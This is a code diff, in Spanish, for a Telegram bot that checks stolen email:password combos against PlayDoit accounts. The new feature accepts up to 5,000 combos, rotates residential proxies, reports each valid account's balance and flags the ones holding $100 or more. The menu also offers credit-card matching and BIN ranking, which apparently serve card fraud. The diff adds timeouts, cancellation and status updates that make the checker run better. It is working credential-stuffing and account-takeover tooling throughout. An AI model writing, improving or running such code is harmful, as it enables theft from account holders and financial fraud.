@@ -228,6 +228,7 @@ def _start_menu_msg(user_id: int, nickname: str):
     buttons.extend([
         [InlineKeyboardButton("💳 CC Auto-Match (/bet)", callback_data="btn_start_bet")],
         [InlineKeyboardButton("🔑 Check Combos (/check)", callback_data="btn_start_check")],
+        [InlineKeyboardButton("🔴 Check PlayDoit (/check_playdoit)", callback_data="btn_start_check_playdoit")],
         [InlineKeyboardButton("📊 Mi Rendimiento", callback_data="btn_start_operator_stats")],
         [InlineKeyboardButton("📡 Radar & Ranking de BINes", callback_data="btn_start_bin_radar")],
         [InlineKeyboardButton("❔ Manual & Ayuda", callback_data="btn_start_help")],
@@ -492,6 +493,28 @@ async def start_buttons_callback(update: Update, context: ContextTypes.DEFAULT_T
             reply_markup=kb,
         )
         return WAIT_CHECK_CONFIRM
+    elif query.data == "btn_start_check_playdoit":
+        kb = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
+                    )
+                ]
+            ]
+        )
+        await _edit_msg(
+            query,
+            f"{HEADER}\n\n"
+            "🔴 <b>Verificación de Cuentas PlayDoit (/check_playdoit)</b>\n\n"
+            "Envía combos en chat (máx 100) o adjunta un archivo .txt (máx 5,000):\n"
+            "<code>correo:contraseña</code>\n\n"
+            "• Saldo al frente y streaming de hits en tiempo real.\n"
+            "• Detección automática de saldos y retiros.\n"
+            "• Rotación inteligente con proxies residenciales.",
+            reply_markup=kb,
+        )
+        return WAIT_CHECK_PLAYDOIT_CONFIRM
     elif query.data == "btn_start_help":
         msg = (
             f"{HEADER}\n\n"
@@ -531,6 +554,7 @@ async def start_buttons_callback(update: Update, context: ContextTypes.DEFAULT_T
         user_id = update.effective_user.id
         # Limpiar estados transitorios pero preservar procesos activos en segundo plano
         context.user_data.pop("pending_check", None)
+        context.user_data.pop("pending_check_playdoit", None)
         context.user_data.pop("filtered_summary", None)
         context.user_data.pop("pending_bet_pipes", None)
         context.user_data.pop("pending_tol_pipes", None)
@@ -1123,7 +1147,7 @@ async def handle_check_playdoit_callback(update: Update, context: ContextTypes.D
 
 def _format_playdoit_hit_line(hit: Any) -> str:
     """Formatea una línea de hit: balance primero, luego combo copiable.
-    Diferenciador 💰 para cuentas con saldo >= $100.
+    Diferenciador 💰 para cuentas con saldo >= $100 colocado después del monto.
     """
     if isinstance(hit, dict):
         bal = float(hit.get("balance_total", 0.0) or 0.0)
@@ -1135,7 +1159,7 @@ def _format_playdoit_hit_line(hit: Any) -> str:
         password = getattr(hit, "password", "")
     combo = f"{email}:{password}"
     if bal >= 100.0:
-        return f"💰 <b>${bal:,.2f}</b> | <code>{combo}</code>"
+        return f"• <b>${bal:,.2f}</b> 💰 | <code>{combo}</code>"
     elif bal > 0.0:
         return f"• <b>${bal:,.2f}</b> | <code>{combo}</code>"
     else:
@@ -1184,12 +1208,24 @@ async def _run_check_playdoit_task(
     )
 
     try:
+        last_status_edit_time = 0.0
         for idx, item in enumerate(valid_combos, 1):
+            if asyncio.current_task().cancelled():
+                logger.info(f"[check_playdoit] Tarea cancelada por operador en combo {idx}/{total}")
+                break
+
             email = item["email"]
             password = item["password"]
 
             try:
-                result, used_proxy = await check_playdoit_with_failover(email, password)
+                result, used_proxy = await asyncio.wait_for(
+                    check_playdoit_with_failover(email, password),
+                    timeout=22.0,
+                )
+            except asyncio.TimeoutError:
+                logger.warning(f"[check_playdoit] Timeout absoluto 22s al verificar {email}")
+                errors_count += 1
+                result = None
             except Exception as ex_call:
                 logger.warning(f"[check_playdoit] Error al verificar {email}: {ex_call}")
                 errors_count += 1
@@ -1229,6 +1265,7 @@ async def _run_check_playdoit_task(
                             ),
                             parse_mode="HTML",
                         )
+                        last_status_edit_time = time.time()
                     else:
                         if len(current_hit_buffer) < HITS_PER_BLOCK and len(hits_text) <= 3900:
                             await _safe_edit_tg(hit_message, hits_text)
@@ -1256,6 +1293,7 @@ async def _run_check_playdoit_task(
                                 ),
                                 parse_mode="HTML",
                             )
+                            last_status_edit_time = time.time()
                 except Exception as ex_stream:
                     logger.warning(f"[check_playdoit] Error en stream de hits: {ex_stream}")
 
@@ -1268,7 +1306,9 @@ async def _run_check_playdoit_task(
             else:
                 errors_count += 1
 
-            if idx % 2 == 0 or idx == total:
+            now = time.time()
+            if (now - last_status_edit_time >= 1.5) or idx == total:
+                last_status_edit_time = now
                 try:
                     await _safe_edit_tg(
                         status_msg,
@@ -3081,6 +3121,7 @@ def build_app():
     check_playdoit_handler = ConversationHandler(
         entry_points=[
             CommandHandler(["check_playdoit", "checkplaydoit"], check_playdoit_cmd),
+            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_check_playdoit$"),
         ],
         states={
             WAIT_CHECK_PLAYDOIT_CONFIRM: [
